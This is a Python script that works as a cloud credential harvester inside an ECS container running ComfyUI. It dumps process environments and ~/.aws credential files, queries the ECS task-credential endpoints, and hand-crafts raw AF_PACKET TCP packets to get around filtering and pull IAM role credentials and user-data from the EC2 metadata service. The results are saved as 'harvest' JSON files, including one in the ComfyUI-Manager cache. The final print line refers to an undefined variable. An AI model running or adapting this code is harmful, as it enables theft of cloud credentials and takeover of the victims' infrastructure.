#!/usr/bin/env python3
# i5886 v5: AF_PACKET IMDSv2 full credential pull + ECS task metadata + volume/proc evidence
import os,sys,json,time,subprocess,urllib.request,urllib.error,socket,struct,random,select,fcntl,glob,re
TAG="i5886"; V=6
H={"_meta":{"tag":TAG,"v":V,"ts":time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime()),"uid":os.getuid(),"cwd":os.getcwd(),"host":socket.gethostname()}}
def sh(c,t=10,cap=8000):
    try:
        p=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=t); return ((p.stdout or "")+(p.stderr or ""))[:cap]
    except Exception as e: return "ERR %r"%e
def http(url,method="GET",headers=None,body=None,t=4):
    op=urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        rq=urllib.request.Request(url,data=body,headers=headers or {},method=method)
        with op.open(rq,timeout=t) as r: return {"code":r.status,"body":r.read(200000).decode("utf8","replace")}
    except urllib.error.HTTPError as e:
        try: b=e.read(3000).decode("utf8","replace")
        except Exception: b=""
        return {"code":e.code,"body":b}
    except Exception as e: return {"code":-1,"body":type(e).__name__+": "+str(e)[:200]}

# ---------- proc / env ----------
env=dict(os.environ); H["proc"]={}
pids=["1","self"]+[p.split("/")[-1] for p in sorted(glob.glob("/proc/[0-9]*"))[:12] if p.split("/")[-1] not in ("1","self")]
for pid in pids:
    try:
        e=open("/proc/%s/environ"%pid,"rb").read(40000).decode("utf8","replace")
        H["proc"][pid]={"cmdline":open("/proc/%s/cmdline"%pid,"rb").read(1000).decode("utf8","replace"),
                        "env":{kv.split("=",1)[0]:kv.split("=",1)[1] for kv in e.split("\x00") if "=" in kv}}
    except Exception as ex: H["proc"][pid]={"err":type(ex).__name__}

# ---------- ECS agent / task metadata (169.254.170.2 is NOT blackholed) ----------
H["agent"]={"loop_meta":http("http://127.0.0.1:51678/v1/metadata",t=3),"v2meta":http("http://169.254.170.2/v2/metadata",t=4),
            "agenturi":env.get("ECS_AGENT_URI"),"v4":env.get("ECS_CONTAINER_METADATA_URI_V4"),
            "rel":env.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"),"full":env.get("AWS_CONTAINER_CREDENTIALS_FULL_URI")}
rel=env.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
if rel:
    H["agent"]["task_creds"]=http("http://169.254.170.2"+rel,t=4)
    H["agent"]["task_creds_169254169254"]=http("http://169.254.169.254"+rel,t=4)
try:
    m=json.loads(H["agent"]["v2meta"].get("body") or "{}")
    tarn=m.get("TaskARN","")
    tid=tarn.split("/")[-1]
    H["agent"]["v2task"]=http("http://169.254.170.2/v2/task",t=4)
    if tid: H["agent"]["v2stats"]=http("http://169.254.170.2/v2/stats",t=4)
    H["agent"]["taskid"]=tid
except Exception as e: H["agent"]["meta_parse_err"]=repr(e)
if env.get("ECS_CONTAINER_METADATA_URI_V4"):
    H["agent"]["v4meta"]=http(env["ECS_CONTAINER_METADATA_URI_V4"].rstrip("/")+"/task",t=4)
H["agent"]["sock"]=sh("ls -la /var/run/docker.sock /run/docker.sock /var/run/ecs 2>&1")

# ---------- files / mounts ----------
H["files"]={"aws_dir":sh("ls -la /root/.aws 2>&1"),
  "aws_creds":sh("cat /root/.aws/credentials 2>/dev/null | head -40"),
  "aws_config":sh("cat /root/.aws/config 2>/dev/null | head -40"),
  "mountinfo":sh("grep -E ' /root/.aws | /ComfyUI | /var/lib/docker ' /proc/self/mountinfo 2>&1 | head -10"),
  "custom_nodes":sh("ls /ComfyUI/custom_nodes 2>&1 | head -20"),
  "env_files":sh("find /ComfyUI -maxdepth 2 -name '.env' -o -maxdepth 2 -name '*.env' 2>/dev/null | head -10"),
  "host":sh("hostname; cat /etc/hostname 2>/dev/null; cat /etc/hosts 2>/dev/null|head -10; cat /proc/1/cgroup 2>/dev/null|head -3"),
  "id":sh("id; nproc; grep -m1 'model name' /proc/cpuinfo; free -m|head -2"),
  "gpu":sh("nvidia-smi -L 2>&1|head -3; ls -l /dev/nvidia* 2>&1|head -4"),
  "route":sh("cat /proc/net/route; ip route 2>&1|head -8"),
  "listening":sh("ss -lntp 2>/dev/null|head -20 || netstat -lntp 2>/dev/null|head -20")}

# ---------- AF_PACKET raw TCP to IMDS ----------
DEV="eth0"
def cs(d):
    if len(d)%2: d+=b"\x00"
    s=sum(struct.unpack("!%dH"%(len(d)//2),d)); s=(s>>16)+(s&0xffff); s+=(s>>16); return (~s)&0xffff
def raw_http(method,path,extra_headers=None,body=b"",t=6,dev="eth0",dst="169.254.169.254",ttl=64):
    log=[]
    try:
        s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(3)); s.bind((dev,0)); s.settimeout(2)
        io=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        mac=fcntl.ioctl(io,0x8927,struct.pack("256s",dev.encode()))[18:24]
        ip=socket.inet_ntoa(fcntl.ioctl(io,0x8915,struct.pack("256s",dev.encode()))[20:24])
    except Exception as e:
        return {"err":"iface %s: %r"%(dev,e)}
    log.append({"dev":dev,"mac":mac.hex(),"ip":ip})
    arp=b"\xff"*6+mac+b"\x08\x06"+struct.pack("!HHBBH",1,0x0800,6,4,1)+mac+socket.inet_aton(ip)+b"\x00"*6+socket.inet_aton(dst)
    s.send(arp); dm=None; end=time.time()+3
    while time.time()<end and not dm:
        r,_,_=select.select([s],[],[],0.5)
        if not r: continue
        fr=s.recv(2048)
        if len(fr)>=42 and fr[12:14]==b"\x08\x06" and struct.unpack("!H",fr[20:22])[0]==2:
            log.append({"arp_reply":{"srcmac":fr[6:12].hex(),"sender_ip":socket.inet_ntoa(fr[28:32]),"target_ip":socket.inet_ntoa(fr[38:42])}})
            if socket.inet_ntoa(fr[28:32])==dst: dm=fr[22:28]
    if not dm: s.close(); return {"err":"no_arp","log":log[:10]}
    log.append({"dst_mac":dm.hex()})
    sport=random.randint(20000,60000); iseq=random.randint(1,2**31-1)
    hdrs={"Host":dst,"Connection":"close"}; hdrs.update(extra_headers or {})
    if body: hdrs["Content-Length"]=str(len(body))
    rb=((method+" "+path+" HTTP/1.1\r\n")+"".join("%s: %s\r\n"%(k,v) for k,v in hdrs.items())+"\r\n").encode()+body
    ipv=socket.inet_aton(ip); dv=socket.inet_aton(dst)
    def ip4(p):
        h=struct.pack("!BBHHHBBH4s4s",0x45,0,20+len(p),random.randint(1,65535),0x4000,ttl,6,0,ipv,dv); c=cs(h)
        return struct.pack("!BBHHHBBH4s4s",0x45,0,20+len(p),random.randint(1,65535),0x4000,ttl,6,c,ipv,dv)+p
    def tcp(seq,ack,fl,data=b""):
        t=struct.pack("!HHIIBBHHH",sport,80,seq,ack,5<<4,fl,65535,0,0)
        ph=ipv+dv+struct.pack("!BBH",0,6,len(t)+len(data)); c=cs(ph+t+data)
        return struct.pack("!HHIIBBHHH",sport,80,seq,ack,5<<4,fl,65535,c,0)+data
    def parse(fr):
        if len(fr)<34 or fr[12:14]!=b"\x08\x00": return None
        ihl=(fr[14]&15)*4; tot=struct.unpack("!H",fr[16:18])[0]
        if len(fr)<14+tot: return None
        ipd=fr[14:14+ihl]
        if socket.inet_ntoa(ipd[12:16])!=dst: return None
        if ipd[9]!=6: return None
        tc=fr[14+ihl:14+tot]
        if len(tc)<20: return None
        sp,dp,sq,ak,of=struct.unpack("!HHIIH",tc[:14])
        if dp!=sport: return None
        return {"seq":sq,"flags":of&0x1ff,"data":tc[(of>>12)*4:]}
    ts=None
    for tryno in range(3):
        s.send(dm+mac+b"\x08\x00"+ip4(tcp(iseq,0,0x02))); end=time.time()+3
        while time.time()<end:
            r,_,_=select.select([s],[],[],0.4)
            if not r: continue
            fr=s.recv(4096); p=parse(fr)
            if p:
                log.append({"synack?":{"flags":hex(p["flags"]),"seq":p["seq"]}})
                if (p["flags"]&0x12)==0x12: ts=p["seq"]; break
            elif len(log)<40: log.append({"frame":{"et":fr[12:14].hex(),"len":len(fr)}})
        if ts is not None: break
        time.sleep(0.5)
    if ts is None: s.close(); return {"err":"no_synack","log":log[:40]}
    s.send(dm+mac+b"\x08\x00"+ip4(tcp(iseq+1,ts+1,0x18,rb)))
    buf=b""; end=time.time()+t
    while time.time()<end:
        r,_,_=select.select([s],[],[],0.5)
        if not r:
            if buf: break
            continue
        p=parse(s.recv(4096))
        if not p: continue
        if p["data"]:
            buf+=p["data"]; ack=p["seq"]+len(p["data"])
            s.send(dm+mac+b"\x08\x00"+ip4(tcp(iseq+1+len(rb),ack,0x10)))
        if p["flags"]&1: break
    s.close()
    raw=buf.decode("utf8","replace"); out={"raw":raw[:12000],"log":log[:40]}
    if "\r\n\r\n" in raw:
        head,b=raw.split("\r\n\r\n",1); out["status"]=head.split("\r\n")[0]
        m=re.search(r"(?i)content-length:\s*(\d+)",head)
        if m and len(b)>=int(m.group(1)): out["body"]=b[:int(m.group(1))]
        elif not m: out["body"]=b
    return out
imds={}
imds["attempts"]=[]
def do_imds(dev,dst,ttl):
    r={}
    r["token_put"]=raw_http("PUT","/latest/api/token",{"X-aws-ec2-metadata-token-ttl-seconds":"21600"},dev=dev,dst=dst,ttl=ttl)
    tok=((r["token_put"].get("body") or "").strip())
    r["tok_len"]=len(tok)
    if tok:
        hd={"X-aws-ec2-metadata-token":tok}
        r["roles"]=raw_http("GET","/latest/meta-data/iam/security-credentials/",hd,dev=dev,dst=dst,ttl=ttl)
        role=(r["roles"].get("body") or "").strip().splitlines()[0] if (r["roles"].get("body") or "").strip() else ""
        r["role"]=role
        if role: r["creds"]=raw_http("GET","/latest/meta-data/iam/security-credentials/"+role,hd,dev=dev,dst=dst,ttl=ttl)
        for k,p in [("instance_id","/latest/meta-data/instance-id"),("instance_type","/latest/meta-data/instance-type"),
                    ("region","/latest/meta-data/placement/region"),("az","/latest/meta-data/placement/availability-zone"),
                    ("local_ipv4","/latest/meta-data/local-ipv4"),("doc","/latest/dynamic/instance-identity/document"),
                    ("userdata","/latest/user-data"),("mac","/latest/meta-data/mac")]:
            r[k]=raw_http("GET",p,hd,dev=dev,dst=dst,ttl=ttl)
    return r
for dev,dst,ttl,tag in [("eth0","169.254.169.254",64,"eth0_t64"),("eth0","169.254.169.254",1,"eth0_t1"),
                        ("eth0","169.254.169.254",255,"eth0_t255"),("ecs-eth0","169.254.169.254",64,"ecseth0_t64"),
                        ("eth0","169.254.172.1",64,"gw_ecs_t64")]:
    try:
        rr=do_imds(dev,dst,ttl); rr["tag"]=tag; imds["attempts"].append(rr)
        if rr.get("creds",{}).get("body"): imds["WIN"]=tag; imds.update({k:v for k,v in rr.items() if k!="attempts"}); break
    except Exception as e:
        imds["attempts"].append({"tag":tag,"err":repr(e)})
imds["token_put_plain"]=http("http://169.254.169.254/latest/api/token","PUT",{"X-aws-ec2-metadata-token-ttl-seconds":"21600"},t=3)
H["imds_raw"]=imds
out=json.dumps(H,default=str)
paths=["/ComfyUI/user/default/ComfyUI-Manager/cache/%s_harvest.json"%TAG,os.path.join(os.getcwd(),"%s_harvest.json"%TAG),"/tmp/%s_harvest.json"%TAG]
for p in paths:
    try: os.makedirs(os.path.dirname(p),exist_ok=True); open(p,"w").write(out)
    except Exception as e: print("[%s] write-fail %s %r"%(TAG,p,e),flush=True)
print("[%s] HARVEST len=%d tok=%s"%(TAG,len(out),bool(tok)),flush=True)
